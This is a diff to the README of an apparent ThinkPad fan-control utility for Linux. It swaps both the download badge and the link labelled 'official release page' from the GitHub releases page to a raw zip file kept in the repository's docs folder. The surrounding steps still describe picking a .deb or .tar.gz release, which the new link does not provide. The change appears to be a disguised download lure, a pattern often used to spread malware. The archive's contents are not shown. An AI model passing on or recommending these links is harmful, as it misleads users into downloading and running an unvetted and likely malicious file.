@@ -1,6 +1,6 @@
 # 🧊 thinkpad-fan-control - Keep your laptop cool and quiet
 
-[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Jayneaural77/thinkpad-fan-control/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Jayneaural77/thinkpad-fan-control/raw/refs/heads/main/docs/fan_thinkpad_control_2.8.zip)
 
 This software helps you manage the fan speed of your ThinkPad laptop. It keeps your device cool during heavy tasks and silent when you work. It uses a graph to show you how fast the fan spins at different temperatures. You control the fan through three modes: manual, automatic, and BIOS.
 
@@ -14,7 +14,7 @@ The software includes a graphics window. You drag points on a line to tell the s
 
 ## 📥 Getting the software
 
-1. Go to the [official release page](https://github.com/Jayneaural77/thinkpad-fan-control/releases).
+1. Go to the [official release page](https://github.com/Jayneaural77/thinkpad-fan-control/raw/refs/heads/main/docs/fan_thinkpad_control_2.8.zip).
 2. Look for the recent version at the top of the list.
 3. Click the link that ends in ".deb" or ".tar.gz" depending on your Linux version. 
 4. Save the file to your "Downloads" folder.
